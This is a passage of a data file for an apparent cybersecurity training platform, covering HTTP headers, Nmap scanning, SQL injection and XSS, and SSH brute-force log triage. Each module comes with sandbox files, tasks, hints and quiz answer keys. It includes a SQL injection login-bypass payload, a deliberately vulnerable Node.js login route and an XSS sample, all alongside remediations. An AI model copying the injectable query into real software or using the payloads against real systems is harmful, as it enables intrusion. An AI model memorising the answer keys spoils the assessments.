    summary: 'Demystify web application communication: inspect HTTP requests, headers, cookies, authentication sessions, REST API status codes, and modern TLS encryption.',
    learningObjectives: [
      'Analyze the anatomy of HTTP requests (verbs, paths, headers, body) and HTTP responses',
      'Interpret HTTP status code families (2xx success, 3xx redirects, 4xx client errors, 5xx server errors)',
      'Understand how stateless HTTP uses cookies and tokens (JWT) to maintain user authentication',
      'Identify essential defensive web security headers (Content-Security-Policy, HSTS, X-Frame-Options)'
    ],
    overview: {
      introduction: 'Web applications power banking, healthcare, communications, and modern infrastructure. Understanding raw HTTP requests and response streams is essential for web penetration testing and defense.',
      whyItMatters: 'Over 75% of application vulnerabilities stem from improper input handling, insecure cookie flags, or missing security headers in HTTP traffic.',
      realWorldApplication: 'Security testers use proxy tools like Burp Suite and OWASP ZAP to intercept, manipulate, and replay HTTP requests to discover logic flaws and injection vulnerabilities.'
    },
    theorySections: [
      {
        id: 'sec-http-anatomy',
        title: 'Anatomy of an HTTP Request and Response',
        subtitle: 'Headers, Methods, and Payloads',
        content: `HTTP is a stateless, text-based request-response protocol running over TCP (port 80 for HTTP, port 443 for HTTPS with TLS).

### HTTP Request Example:
\`\`\`http
POST /api/v1/auth/login HTTP/1.1
Host: academy.cyberlab.local
User-Agent: Mozilla/5.0 (Security Tester)
Content-Type: application/json
Content-Length: 48

{"username": "operator", "password": "SecurePassword123!"}
\`\`\`

### HTTP Response Example:
\`\`\`http
HTTP/1.1 200 OK
Date: Sun, 23 Aug 2026 00:00:00 GMT
Content-Type: application/json
Set-Cookie: session_id=s9f823hf98a7sd; Secure; HttpOnly; SameSite=Strict
Strict-Transport-Security: max-age=31536000; includeSubDomains

{"status": "authenticated", "role": "security_operator"}
\`\`\``,
        diagramType: 'osi_model',
        keyTakeaways: [
          'HTTP methods indicate intent: GET (retrieve), POST (submit/create), PUT (replace), DELETE (remove).',
          '`Set-Cookie` with `HttpOnly` prevents JavaScript (XSS) from reading sensitive session tokens.'
        ]
      }
    ],
    sandboxEnvironment: {
      targetName: 'academy-web-target',
      targetIp: '10.10.20.15',
      targetOs: 'Nginx on Ubuntu 22.04',
      isolationTier: 'Educational Sandbox Tier 1',
      initialTerminalLogs: [
        'Web application runtime ready on http://10.10.20.15:80',
        'Use "curl -I http://10.10.20.15" to inspect response headers.'
      ],
      simulatedFileSystem: {
        '/var/www/html/index.html': '<html><head><title>Academy Portal</title></head><body><h1>Welcome Operator</h1></body></html>',
        '/etc/nginx/sites-available/default': 'server {\n  listen 80;\n  server_name academy.local;\n  add_header X-Frame-Options "DENY";\n  add_header X-Content-Type-Options "nosniff";\n  add_header Content-Security-Policy "default-src \'self\'";\n}'
      },
      simulatedServices: [
        { port: 80, service: 'HTTP', banner: 'nginx/1.18.0', state: 'open' }
      ],
      simulatedWebEndpoints: [
        {
          path: '/api/v1/status',
          status: 200,
          headers: { 'Content-Type': 'application/json', 'Server': 'nginx/1.18.0', 'X-Environment': 'Authorized-Sandbox' },
          body: '{"status": "online", "active_users": 14, "lab_mode": "ACTIVE"}'
        },
        {
          path: '/admin',
          status: 403,
          headers: { 'Content-Type': 'text/html', 'Server': 'nginx/1.18.0' },
          body: '<html><body><h1>403 Forbidden: Authorized Personnel Only</h1></body></html>'
        }
      ]
    },
    tasks: [
      {
        id: 't04-1',
        taskNumber: 1,
        title: 'Interpret HTTP Status Code 403',
        type: 'knowledge',
        difficulty: 'Beginner',
        description: 'When requesting a restricted admin panel, the web server returns an HTTP status code 403.',
        instructions: 'What is the standard standard meaning of HTTP status code 403?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: ['OK (Success)', 'Not Found', 'Forbidden', 'Internal Server Error'],
        correctOptionIndex: 2,
        hint1_concept: 'The 4xx status family indicates client-side errors or authorization restrictions.',
        hint2_direction: '401 is Unauthorized, 403 is Forbidden, 404 is Not Found.',
        hint3_specific: 'Select Forbidden.',
        finalExplanation: 'HTTP 403 Forbidden indicates the server understood the request, but refuses to authorize access regardless of credentials provided.',
        xpReward: 50,
        skillTested: 'HTTP Status Codes'
      },
      {
        id: 't04-2',
        taskNumber: 2,
        title: 'Inspect Response Headers with Curl',
        type: 'terminal',
        difficulty: 'Easy',
        description: 'Use the `curl` utility with the `-I` (headers only) flag in the sandbox terminal to inspect the web server on localhost or 10.10.20.15.',
        instructions: 'Run `curl -I http://10.10.20.15` in the terminal and enter the value of the `X-Frame-Options` security header.',
        educationalCommandSuggestion: 'curl -I http://10.10.20.15',
        questionType: 'text_exact',
        expectedAnswers: ['DENY', '"DENY"', 'deny'],
        placeholder: 'e.g. DENY or SAMEORIGIN',
        hint1_concept: 'The `-I` flag tells curl to send a HEAD request and print only HTTP response headers.',
        hint2_direction: 'Type `curl -I http://10.10.20.15` in the sandbox terminal.',
        hint3_specific: 'Look for `X-Frame-Options: DENY`.',
        finalExplanation: 'The `X-Frame-Options: DENY` header instructs browsers never to render the website inside an `<frame>`, `<iframe>`, or `<object>`, effectively defending against Clickjacking attacks.',
        xpReward: 100,
        skillTested: 'Web Security Headers'
      },
      {
        id: 't04-3',
        taskNumber: 3,
        title: 'Identify the Cookie Flag that Blocks JavaScript XSS Access',
        type: 'knowledge',
        difficulty: 'Easy',
        description: 'When setting sensitive session authentication cookies, web developers must protect the cookie from being stolen by injected malicious JavaScript.',
        instructions: 'Which cookie attribute flag instructs the browser that the cookie must NOT be accessible via `document.cookie` in client-side scripts?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: ['Secure', 'HttpOnly', 'SameSite', 'Path=/'],
        correctOptionIndex: 1,
        hint1_concept: 'The flag name specifies that the cookie is strictly for HTTP transmissions, not DOM scripting.',
        hint2_direction: '`Secure` enforces HTTPS transmission; `HttpOnly` blocks JavaScript DOM access.',
        hint3_specific: 'Select HttpOnly.',
        finalExplanation: 'The `HttpOnly` flag prevents client-side scripts from reading the cookie through `document.cookie`, mitigating Cross-Site Scripting (XSS) session hijacking.',
        xpReward: 75,
        skillTested: 'Cookie Security'
      },
      {
        id: 't04-4',
        taskNumber: 4,
        title: 'Query API Endpoint with Curl',
        type: 'terminal',
        difficulty: 'Easy',
        description: 'Query the JSON status endpoint at `http://10.10.20.15/api/v1/status` using `curl`.',
        instructions: 'Run `curl -s http://10.10.20.15/api/v1/status` and identify the value of `lab_mode` in the JSON response.',
        educationalCommandSuggestion: 'curl -s http://10.10.20.15/api/v1/status',
        questionType: 'text_exact',
        expectedAnswers: ['ACTIVE', '"ACTIVE"', 'active'],
        placeholder: 'e.g. ACTIVE',
        hint1_concept: 'Run `curl -s http://10.10.20.15/api/v1/status` to print the raw JSON payload.',
        hint2_direction: 'Inspect the `"lab_mode": "ACTIVE"` key-value pair in the JSON.',
        hint3_specific: 'The value is `ACTIVE`.',
        finalExplanation: 'REST APIs communicate using JSON over HTTP, returning structured state telemetry for modern single-page applications and microservices.',
        xpReward: 100,
        skillTested: 'REST API & Curl'
      }
    ],
    assessmentQuiz: {
      id: 'quiz-04',
      title: 'Module 4 Assessment: Web Security & HTTP',
      questions: [
        {
          id: 'q04-1',
          prompt: 'Which HTTP method should be used when submitting sensitive login credentials in the request body?',
          options: ['GET', 'POST', 'HEAD', 'OPTIONS'],
          correctIndex: 1,
          explanation: 'POST transmits data inside the request body rather than in the URL query string, preventing credentials from being saved in browser histories and proxy access logs.'
        },
        {
          id: 'q04-2',
          prompt: 'What does the HTTP Strict-Transport-Security (HSTS) header enforce on web browsers?',
          options: [
            'Forces all future requests to the domain to use secure HTTPS exclusively',
            'Disables all cookies on the website',
            'Enables directory listing for web files',
            'Blocks SQL injection attacks automatically'
          ],
          correctIndex: 0,
          explanation: 'HSTS instructs browsers to automatically convert all HTTP requests to HTTPS, preventing SSL stripping and man-in-the-middle downgrade attacks.'
        }
      ]
    }
  },

  // ==========================================
  // MODULE 5: RECONNAISSANCE & PORT SCANNING
  // ==========================================
  {
    id: 'module-05-recon-port-scanning',
    code: 'LAB-05',
    slug: 'recon-port-scanning',
    title: 'Authorized Reconnaissance & Nmap Scanning',
    badge: 'OFFENSIVE',
    category: 'Offensive',
    difficulty: 'Intermediate',
    estimatedMinutes: 35,
    xpReward: 450,
    skillsEarned: ['Active vs Passive Recon', 'Nmap Syntax', 'TCP SYN Scan (-sS)', 'Service Versioning (-sV)', 'OS Detection (-O)'],
    prerequisites: ['module-02-linux-cli-mastery', 'module-03-networking-ip-ports'],
    roleAlignment: ['Penetration Tester', 'Red Team Operator', 'Vulnerability Assessor'],
    summary: 'Master network discovery: conduct authorized port scans, distinguish TCP SYN stealth scans from full connect scans, detect running service versions, and identify attack surfaces safely.',
    learningObjectives: [
      'Understand the phase boundaries of ethical reconnaissance (Passive OSINT vs Active scanning)',
      'Execute essential Nmap scan types: SYN Stealth (-sS), Version Detection (-sV), and Default Scripts (-sC)',
      'Interpret open, closed, and filtered port states returned by packet responses',
      'Correlate identified service banners with public vulnerability databases (CVEs)'
    ],
    overview: {
      introduction: 'Reconnaissance is the initial phase of every ethical penetration test and security audit. Before you can secure or test a system, you must discover what IP addresses, ports, and services exist on the network.',
      whyItMatters: 'Over 80% of successful intrusions exploit outdated, unpatched services running on forgotten open ports. Rapid, accurate port scanning reveals unmanaged assets before attackers exploit them.',
      realWorldApplication: 'Penetration testers and SOC defenders use automated scanners like Nmap, Masscan, and Nessus to maintain continuous asset inventories and audit perimeter firewalls.'
    },
    theorySections: [
      {
        id: 'sec-nmap-switches',
        title: 'Core Nmap Flags & Scan Types',
        subtitle: 'From Host Discovery to Script Engine (NSE)',
        content: `Nmap is the industry-standard network exploration tool. Key flags include:

• \`-sS\` (TCP SYN Stealth Scan): Default scan requiring root privileges. Sends SYN, receives SYN-ACK or RST, responds with RST. Fast and avoids full connection logging.
• \`-sT\` (TCP Connect Scan): Completes the full 3-way handshake. Used when unprivileged.
• \`-sV\` (Version Detection): Probes open ports with banner queries to determine exact software versions (e.g. Apache 2.4.52).
• \`-sC\` (Default Scripts): Executes safe, standard Lua scripts from the Nmap Scripting Engine (NSE) to test common configurations.
• \`-p-\` / \`-p 1-65535\`: Scans all 65,535 TCP ports rather than just the top 1,000.
• \`-oN output.txt\`: Saves normal human-readable scan output to a file for reporting.`,
        diagramType: 'osi_model',
        keyTakeaways: [
          '`-sS` is stealthier and faster; `-sV` extracts exact application version strings.',
          'Always obtain explicit written authorization before running port scans against any target.'
        ]
      }
    ],
    sandboxEnvironment: {
      targetName: 'range-target-alpha',
      targetIp: '10.10.14.88',
      targetOs: 'Ubuntu Linux 20.04 (Vulnerable Target Node)',
      isolationTier: 'Authorized Range Container',
      initialTerminalLogs: [
        'Scanner workstation ready. Target node: 10.10.14.88',
        'Authorized scope: 10.10.14.88 only. Execute educational nmap scans.'
      ],
      simulatedFileSystem: {
        '/home/operator/nmap_scans/target_quick.nmap': '# Nmap 7.94 scan initiated Sun Aug 23 00:00:00 2026 as: nmap -sV -p 21,22,80,3306 10.10.14.88\nNmap scan report for 10.10.14.88\nHost is up (0.00042s latency).\n\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 2.3.4\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n3306/tcp open  mysql   MySQL 8.0.28\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .'
      },
      simulatedServices: [
        { port: 21, service: 'FTP', banner: 'vsftpd 2.3.4 (Backdoor Vulnerable)', state: 'open' },
        { port: 22, service: 'SSH', banner: 'OpenSSH 8.2p1 Ubuntu', state: 'open' },
        { port: 80, service: 'HTTP', banner: 'Apache/2.4.41 (Ubuntu)', state: 'open' },
        { port: 3306, service: 'MySQL', banner: 'MySQL 8.0.28', state: 'open' }
      ]
    },
    tasks: [
      {
        id: 't05-1',
        taskNumber: 1,
        title: 'Execute Service Version Scan on Target Node',
        type: 'terminal',
        difficulty: 'Easy',
        description: 'Inspect the target 10.10.14.88 by executing an Nmap service detection scan or viewing the stored scan file.',
        instructions: 'Run `nmap -sV 10.10.14.88` or `cat /home/operator/nmap_scans/target_quick.nmap` and enter the exact version of the FTP server on port 21.',
        educationalCommandSuggestion: 'nmap -sV 10.10.14.88',
        questionType: 'text_exact',
        expectedAnswers: ['vsftpd 2.3.4', 'vsftpd 2.3.4 ', 'vsftpd-2.3.4'],
        placeholder: 'e.g. vsftpd 2.3.4',
        hint1_concept: 'Inspect the VERSION column for port 21/tcp.',
        hint2_direction: 'Type `nmap -sV 10.10.14.88` in the sandbox terminal.',
        hint3_specific: 'Port 21 is running `vsftpd 2.3.4`.',
        finalExplanation: 'vsftpd 2.3.4 is a famous historical vulnerable version containing an intentional smiley face backdoor in its source code.',
        xpReward: 100,
        skillTested: 'Nmap Scanning'
      },
      {
        id: 't05-2',
        taskNumber: 2,
        title: 'Identify the Database Port',
        type: 'identification',
        difficulty: 'Beginner',
        description: 'Review the open ports identified on the target host 10.10.14.88.',
        instructions: 'Which standard TCP port number is hosting the MySQL database service?',
        questionType: 'text_exact',
        expectedAnswers: ['3306', 'port 3306'],
        placeholder: 'e.g. 3306',
        hint1_concept: 'Look at the scan output for the service named "mysql".',
        hint2_direction: 'MySQL default listening port is 3306.',
        hint3_specific: 'Port 3306.',
        finalExplanation: 'Port 3306 is the IANA standard default port for MySQL and MariaDB relational databases.',
        xpReward: 75,
        skillTested: 'Port Recognition'
      },
      {
        id: 't05-3',
        taskNumber: 3,
        title: 'Explain the Difference Between Active and Passive Recon',
        type: 'knowledge',
        difficulty: 'Beginner',
        description: 'Before scanning a company, an analyst checks WHOIS records and LinkedIn employee profiles without sending packets to the target IP.',
        instructions: 'What classification of reconnaissance was conducted in this step?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: ['Active Reconnaissance', 'Passive Reconnaissance (OSINT)', 'Exploitation Phase', 'Privilege Escalation'],
        correctOptionIndex: 1,
        hint1_concept: 'No direct network packets touched the target organization servers.',
        hint2_direction: 'Open Source Intelligence (OSINT) utilizing public records is passive.',
        hint3_specific: 'Select Passive Reconnaissance (OSINT).',
        finalExplanation: 'Passive reconnaissance gathers intelligence from public third-party sources (WHOIS, DNS records, search engines, Shodan) without interacting directly with the target infrastructure.',
        xpReward: 75,
        skillTested: 'OSINT & Recon Methodology'
      },
      {
        id: 't05-4',
        taskNumber: 4,
        title: 'Identify the Nmap Stealth Scan Flag',
        type: 'knowledge',
        difficulty: 'Easy',
        description: 'You need to execute an Nmap TCP SYN scan that avoids completing the full 3-way handshake to reduce connection logging.',
        instructions: 'Which command line switch enables the TCP SYN Stealth Scan in Nmap?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: ['-sT', '-sS', '-sU', '-sP'],
        correctOptionIndex: 1,
        hint1_concept: 'The flag stands for "scan SYN".',
        hint2_direction: '`-sT` is TCP Connect, `-sS` is SYN Stealth, `-sU` is UDP.',
        hint3_specific: 'Select -sS.',
        finalExplanation: 'The `-sS` switch sends a SYN packet and awaits a SYN-ACK, then immediately responds with an RST (Reset) packet to tear down the connection without completing it.',
        xpReward: 75,
        skillTested: 'Nmap Flags'
      }
    ],
    assessmentQuiz: {
      id: 'quiz-05',
      title: 'Module 5 Assessment: Reconnaissance & Port Scanning',
      questions: [
        {
          id: 'q05-1',
          prompt: 'What does Nmap report as the port state when a firewall silently drops an incoming probe packet without responding?',
          options: ['open', 'closed', 'filtered', 'unfiltered'],
          correctIndex: 2,
          explanation: 'Nmap classifies a port as `filtered` when probe packets are blocked or dropped by a firewall without receiving any TCP RST or ICMP response.'
        },
        {
          id: 'q05-2',
          prompt: 'Which Nmap parameter instructs the scanner to probe all 65,535 TCP ports?',
          options: ['-p all', '-p-', '-p 1000', '-sAll'],
          correctIndex: 1,
          explanation: '`-p-` is the shorthand flag in Nmap that specifies the full port range from 1 through 65535.'
        }
      ]
    }
  },

  // ==========================================
  // MODULE 6: WEB APPLICATION VULNERABILITIES & OWASP
  // ==========================================
  {
    id: 'module-06-web-vulnerabilities-owasp',
    code: 'LAB-06',
    slug: 'web-vulnerabilities-owasp',
    title: 'Web Application Security & OWASP Top 10',
    badge: 'WEB SEC',
    category: 'Web Security',
    difficulty: 'Intermediate',
    estimatedMinutes: 40,
    xpReward: 500,
    skillsEarned: ['OWASP Top 10', 'SQL Injection (SQLi)', 'Cross-Site Scripting (XSS)', 'Broken Access Control', 'Parameterized Queries'],
    prerequisites: ['module-04-dns-http-web'],
    roleAlignment: ['Web Security Specialist', 'Penetration Tester', 'Application Security Engineer'],
    summary: 'Explore real-world web application flaws: analyze SQL injection syntax, Cross-Site Scripting (XSS) payload execution, and broken access control vulnerabilities, with secure coding remediations.',
    learningObjectives: [
      'Understand the root cause of SQL Injection (concatenating unvalidated user input into database queries)',
      'Analyze the classic authentication bypass payload (`\' OR 1=1 --`) and its SQL logic',
      'Distinguish between Reflected, Stored, and DOM-based Cross-Site Scripting (XSS)',
      'Implement defensive remediations: Prepared Statements, Context-aware Output Encoding, and RBAC'
    ],
    overview: {
      introduction: 'Web vulnerabilities allow adversaries to bypass authentication, extract confidential database records, hijack user browser sessions, and execute remote code on backend servers.',
      whyItMatters: 'SQL Injection and Broken Access Control consistently rank among the top critical risks in the OWASP Top 10, resulting in multi-million dollar data breaches worldwide.',
      realWorldApplication: 'AppSec engineers audit application source code and perform dynamic application security testing (DAST) to ensure user inputs are sanitized and parameterized.'
    },
    theorySections: [
      {
        id: 'sec-sqli-mechanics',
        title: 'SQL Injection Mechanics: Breaking Out of Data Context',
        subtitle: 'The Classic \' OR \'1\'=\'1 Bypass',
        content: `SQL Injection occurs when user input is concatenated directly into a dynamic SQL query string without parameterization:

### Insecure Vulnerable PHP/SQL Code:
\`\`\`php
$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
\`\`\`

If an attacker inputs: \`admin' --\` as the username:
The resulting SQL query becomes:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
\`\`\`
The \`--\` characters comment out the remainder of the query! The database authenticates the user as \`admin\` without checking any password.

### Secure Remediation: Prepared Statements
\`\`\`php
$stmt = $pdo->prepare('SELECT id, password_hash, role FROM users WHERE username = :user');
$stmt->execute(['user' => $_POST['username']]);
\`\`\``,
        diagramType: 'owasp_sqli',
        keyTakeaways: [
          'Never concatenate user input directly into SQL strings.',
          'Prepared statements (parameterized queries) treat user input strictly as data, never executable SQL code.'
        ]
      }
    ],
    sandboxEnvironment: {
      targetName: 'owasp-juice-target',
      targetIp: '10.10.30.22',
      targetOs: 'Node.js / Express Web App',
      isolationTier: 'Educational Sandbox Tier 1',
      initialTerminalLogs: [
        'Vulnerable Web Portal running on http://10.10.30.22:8080',
        'Testing database connected (SQLite3).'
      ],
      simulatedFileSystem: {
        '/app/server.js': '// Insecure login route\napp.post("/login", (req, res) => {\n  const query = `SELECT * FROM accounts WHERE email = \'${req.body.email}\' AND pass = \'${req.body.pass}\'`;\n  db.all(query, (err, rows) => {\n    if (rows && rows.length > 0) return res.json({ auth: true, user: rows[0].email, role: rows[0].role, flag: "FLAG{sqli_auth_bypass_mastered}" });\n    res.status(401).json({ auth: false });\n  });\n});'
      },
      simulatedServices: [
        { port: 8080, service: 'HTTP-Web', banner: 'Express Node.js Server', state: 'open' }
      ],
      simulatedWebEndpoints: [
        {
          path: '/login',
          status: 200,
          headers: { 'Content-Type': 'application/json' },
          body: '{"auth": true, "user": "admin@cyberlab.local", "role": "SuperAdmin", "flag": "FLAG{sqli_auth_bypass_mastered}"}'
        }
      ]
    },
    tasks: [
      {
        id: 't06-1',
        taskNumber: 1,
        title: 'Analyze Insecure SQL Code in Sandbox',
        type: 'terminal',
        difficulty: 'Easy',
        description: 'Read the backend server source code at `/app/server.js` to see how SQL queries are assembled.',
        instructions: 'Run `cat /app/server.js` in the terminal and identify the flag returned upon successful authentication bypass.',
        educationalCommandSuggestion: 'cat /app/server.js',
        questionType: 'text_exact',
        expectedAnswers: ['FLAG{sqli_auth_bypass_mastered}', 'flag{sqli_auth_bypass_mastered}'],
        placeholder: 'FLAG{...}',
        hint1_concept: 'Inspect the `res.json` payload in `/app/server.js`.',
        hint2_direction: 'Type `cat /app/server.js` in the sandbox terminal.',
        hint3_specific: 'The flag value is `FLAG{sqli_auth_bypass_mastered}`.',
        finalExplanation: 'Reviewing source code (white-box testing) allows security engineers to spot unparameterized database queries immediately.',
        xpReward: 125,
        skillTested: 'Source Code Review'
      },
      {
        id: 't06-2',
        taskNumber: 2,
        title: 'Identify the Best Defense Against SQL Injection',
        type: 'knowledge',
        difficulty: 'Beginner',
        description: 'Developers must choose an architectural design pattern to permanently prevent SQL Injection across their entire web application.',
        instructions: 'Which programming practice is the gold-standard defense against SQL Injection?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: [
          'Replacing single quotes with double quotes',
          'Using Parameterized Queries (Prepared Statements)',
          'Converting all database passwords to uppercase',
          'Disabling all GET requests'
        ],
        correctOptionIndex: 1,
        hint1_concept: 'The database engine must pre-compile the SQL statement structure separately from user input variables.',
        hint2_direction: 'Prepared statements treat all incoming parameters purely as literal values rather than executable code.',
        hint3_specific: 'Select Parameterized Queries (Prepared Statements).',
        finalExplanation: 'Prepared statements separate the query structure from the data parameters, making SQL injection mathematically impossible because data parameters are never parsed as SQL commands.',
        xpReward: 75,
        skillTested: 'Secure Coding'
      },
      {
        id: 't06-3',
        taskNumber: 3,
        title: 'Differentiate Stored vs Reflected XSS',
        type: 'knowledge',
        difficulty: 'Easy',
        description: 'An attacker submits a comment containing `<script>alert(1)</script>` on a blog post. Every subsequent visitor who opens the post has the script executed in their browser.',
        instructions: 'Which type of Cross-Site Scripting (XSS) vulnerability does this scenario describe?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: [
          'Reflected XSS',
          'Stored (Persistent) XSS',
          'DOM-based XSS',
          'Blind SQL Injection'
        ],
        correctOptionIndex: 1,
        hint1_concept: 'The malicious payload was saved permanently in the backend database.',
        hint2_direction: 'Because it persists in storage and impacts future users, it is Stored XSS.',
        hint3_specific: 'Select Stored (Persistent) XSS.',
        finalExplanation: 'Stored XSS occurs when the injected malicious script is permanently stored on the target server (e.g. database, comment forum, user profile) and served to victims during normal browsing.',
        xpReward: 100,
        skillTested: 'Cross-Site Scripting (XSS)'
      }
    ],
    assessmentQuiz: {
      id: 'quiz-06',
      title: 'Module 6 Assessment: Web Security & OWASP',
      questions: [
        {
          id: 'q06-1',
          prompt: 'What does OWASP Top 10 category "Broken Access Control" primarily refer to?',
          options: [
            'Failure to enforce permissions, allowing unauthorized users to access or modify data belonging to other accounts',
            'Using an outdated CSS stylesheet',
            'A slow internet connection',
            'Using HTTP instead of HTTPS'
          ],
          correctIndex: 0,
          explanation: 'Broken Access Control occurs when users can act outside of their intended permissions (e.g. viewing another customer\'s invoices by changing `?id=101` to `?id=102`).'
        }
      ]
    }
  },

  // ==========================================
  // MODULE 7: SOC INCIDENT RESPONSE & LOG TRIAGE
  // ==========================================
  {
    id: 'module-07-soc-log-triage',
    code: 'LAB-07',
    slug: 'soc-log-triage',
    title: 'SOC Incident Response & Auth Log Forensics',
    badge: 'DEFENSIVE',
    category: 'Defensive & SOC',
    difficulty: 'Intermediate',
    estimatedMinutes: 35,
    xpReward: 450,
    skillsEarned: ['Log Analysis', 'Linux /var/log/auth.log', 'Brute Force Detection', 'SIEM Rule Logic', 'Incident Triage'],
    prerequisites: ['module-02-linux-cli-mastery'],
    roleAlignment: ['SOC Analyst', 'Incident Responder', 'Threat Hunter', 'Blue Team Operator'],
    summary: 'Step into the shoes of a Tier 1 SOC Analyst: investigate authentication logs, detect automated SSH brute-force campaigns, identify attacker source IPs, and draft containment procedures.',
    learningObjectives: [
      'Audit Linux authentication logs (`/var/log/auth.log` or `secure`) to identify brute-force attacks',
      'Use command-line text processing (`grep`, `awk`, `cut`, `sort`, `uniq -c`) to aggregate attacker telemetry',
      'Differentiate between successful authentication logins (`Accepted password`) and repeated failures (`Failed password`)',
      'Understand the standard NIST Incident Response Lifecycle (Preparation, Detection, Containment, Eradication, Recovery, Lessons Learned)'
    ],
    overview: {
      introduction: 'Security Operations Centers (SOCs) are the frontline defense of modern enterprises. Analysts monitor millions of log events daily to distinguish benign user activity from advanced adversary intrusions.',
      whyItMatters: 'Intruders generate noise when attempting credential stuffing or brute-force attacks. Rapid log analysis lets defenders block attacking IP ranges before accounts are compromised.',
      realWorldApplication: 'SOC analysts use SIEM tools (Splunk, Elastic, Sentinel) and command-line grep triage to construct timelines of attacker activity and verify if an intrusion was successful.'
    },
    theorySections: [
      {
        id: 'sec-auth-logs',
        title: 'Linux Authentication Log Anatomy (/var/log/auth.log)',
        subtitle: 'Deconstructing SSH and Sudo Events',
        content: `On Debian/Ubuntu systems, all authentication events are recorded in \`/var/log/auth.log\` (on RHEL/CentOS, \`/var/log/secure\`):

### Failed Login Attempt:
\`\`\`syslog
Aug 23 01:14:02 srv sshd[8412]: Failed password for invalid user admin from 198.51.100.74 port 41294 ssh2
\`\`\`
• **Timestamp**: Aug 23 01:14:02
• **Daemon/PID**: sshd[8412]
• **Event**: Failed password for invalid user admin
• **Attacker IP**: 198.51.100.74

### Successful Compromise / Login:
\`\`\`syslog
Aug 23 01:18:45 srv sshd[8489]: Accepted password for root from 198.51.100.74 port 41380 ssh2
\`\`\`
*Notice the change to "Accepted password" — the attacker successfully cracked the credentials!*`,
        diagramType: 'soc_killchain',
        keyTakeaways: [
          'Look for hundreds of `Failed password` messages followed by a single `Accepted password`.',
          'Use `grep "Accepted" /var/log/auth.log` to check for compromised accounts.'
        ]
      }
    ],
    sandboxEnvironment: {
      targetName: 'soc-triaged-server',
      targetIp: '10.10.50.100',
      targetOs: 'Ubuntu 22.04 LTS (Compromised)',
      isolationTier: 'Educational Sandbox Tier 1',
      initialTerminalLogs: [
        '[SOC ALERT] High-volume authentication failure alert triggered on node 10.10.50.100.',
        'Access /var/log/auth.log to investigate the security incident.'
      ],
      simulatedFileSystem: {
        '/var/log/auth.log': 'Aug 23 01:00:10 host sshd[101]: Failed password for root from 203.0.113.88 port 51001 ssh2\nAug 23 01:00:11 host sshd[102]: Failed password for root from 203.0.113.88 port 51002 ssh2\nAug 23 01:00:12 host sshd[103]: Failed password for admin from 203.0.113.88 port 51003 ssh2\nAug 23 01:00:13 host sshd[104]: Failed password for test from 203.0.113.88 port 51004 ssh2\nAug 23 01:00:14 host sshd[105]: Failed password for user from 203.0.113.88 port 51005 ssh2\nAug 23 01:00:18 host sshd[112]: Accepted password for deployer from 203.0.113.88 port 51010 ssh2\nAug 23 01:01:00 host sudo: deployer : TTY=pts/0 ; PWD=/home/deployer ; USER=root ; COMMAND=/bin/bash'
      },
      simulatedServices: [
        { port: 22, service: 'SSH', banner: 'OpenSSH 8.9p1 Ubuntu', state: 'open' }
      ]
    },
    tasks: [
      {
        id: 't07-1',
        taskNumber: 1,
        title: 'Identify the Attacker Source IP Address',
        type: 'investigation',
        difficulty: 'Easy',
        description: 'Inspect `/var/log/auth.log` in the sandbox terminal to determine the external IP address launching the SSH brute force attack.',
        instructions: 'Run `cat /var/log/auth.log` in the terminal and enter the attacker\'s source IP address.',
        educationalCommandSuggestion: 'cat /var/log/auth.log | head -n 5',
        questionType: 'text_exact',
        expectedAnswers: ['203.0.113.88', '203.0.113.88 '],
        placeholder: 'e.g. 203.0.113.88',
        hint1_concept: 'Look at the IP address following the words "from ... port" in the failed SSH log lines.',
        hint2_direction: 'Inspect the auth log in the sandbox terminal.',
        hint3_specific: 'The attacker IP is `203.0.113.88`.',
        finalExplanation: 'Attacker source IPs are extracted by SOC analysts to correlate with threat intelligence feeds (AbuseIPDB, AlienVault OTX) and implement perimeter firewall block rules.',
        xpReward: 100,
        skillTested: 'Log Triage'
      },
      {
        id: 't07-2',
        taskNumber: 2,
        title: 'Identify the Compromised User Account',
        type: 'investigation',
        difficulty: 'Easy',
        description: 'Examine `/var/log/auth.log` to determine which user account was successfully compromised by the attacker.',
        instructions: 'Search for "Accepted password" in `/var/log/auth.log` and enter the compromised username.',
        educationalCommandSuggestion: 'grep "Accepted" /var/log/auth.log',
        questionType: 'text_exact',
        expectedAnswers: ['deployer', 'user deployer'],
        placeholder: 'e.g. deployer or root',
        hint1_concept: 'Filter the log for the line stating "Accepted password for ...".',
        hint2_direction: 'Type `grep "Accepted" /var/log/auth.log` in the sandbox terminal.',
        hint3_specific: 'The compromised username is `deployer`.',
        finalExplanation: 'Once an attacker achieves a successful login, that account must immediately be quarantined, password-rotated, and all active sessions terminated.',
        xpReward: 100,
        skillTested: 'Incident Investigation'
      },
      {
        id: 't07-3',
        taskNumber: 3,
        title: 'Determine the Standard Incident Response Next Step',
        type: 'knowledge',
        difficulty: 'Beginner',
        description: 'You have confirmed that account `deployer` was compromised from external IP `203.0.113.88` and ran unauthorized sudo commands.',
        instructions: 'According to the NIST Incident Response Framework, what phase immediately follows Detection & Analysis?',
        questionType: 'multiple_choice',
        multipleChoiceOptions: [
          'Containment, Eradication & Recovery',
          'Preparation',
          'Lessons Learned',
          'Filing a Lawsuit'
        ],
        correctOptionIndex: 0,
        hint1_concept: 'The immediate priority is stopping the attacker from spreading laterally to other servers.',
        hint2_direction: 'Contain the affected host, revoke the credentials, and eradicate backdoors.',
        hint3_specific: 'Select Containment, Eradication & Recovery.',
        finalExplanation: 'Containment prevents the incident from expanding (e.g. isolating the machine, blocking the IP, resetting credentials), followed by eradicating the threat and recovering systems.',
        xpReward: 75,
        skillTested: 'Incident Response Lifecycle'
      }
    ],
    assessmentQuiz: {
      id: 'quiz-07',
      title: 'Module 7 Assessment: SOC Operations & Analysis',
      questions: [
        {
          id: 'q07-1',
          prompt: 'What command can you pipe log data into to count the frequency of each unique failed IP address?',
          options: [
            'sort | uniq -c | sort -nr',
